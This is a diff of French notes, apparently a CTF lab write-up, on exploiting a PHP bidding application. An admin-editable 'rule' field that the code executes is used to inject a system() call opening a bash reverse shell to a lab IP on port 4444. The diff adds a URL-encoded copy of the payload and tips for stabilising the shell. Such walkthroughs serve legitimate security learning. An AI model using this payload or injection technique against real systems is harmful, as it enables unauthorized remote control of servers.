@@ -62,7 +62,7 @@ MySQL est dans un état **impossible** :
 Le parseur **attend encore du SQL**
 
 
-Bidding appel ça quand on fait place bidding:
+Bidding appel ça quand on fait \'place bidding\':
 ![[IMG-20251214144151236.png]]
 Dans includes/bid_handler.php on retrouve:
 ![[IMG-20251214144313253.png]]
@@ -88,7 +88,10 @@ Donc on peut mettre une payload dans rule à partir de la page admin:
 ```php
 system("bash -c 'bash -i >& /dev/tcp/10.10.17.132/4444 0>&1'"); return true;
 ```
-
+URL ENCODE:
+```
+system%28%22bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E17%2E132%2F4444%200%3E%261%27%22%29%3B%20return%20true%3B
+```
 return true; est important car dans le code après on vérifie:
 ```php
 if (!$allowed) {
@@ -98,15 +101,20 @@ if (!$allowed) {
 ```
 
 ![[IMG-20251214150054379.png]]
+
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
 astuce pour avoir des options tel que clear dans le reverse shell:
+
 Sur la machine local:
 ```bash
-stty raw -echo
-fg
+stty raw -echo; fg
 ```
 
 Sur le reverse shell:
 ```bash
 export TERM=xterm
-export SHELL=/bin/bash
 ```
+
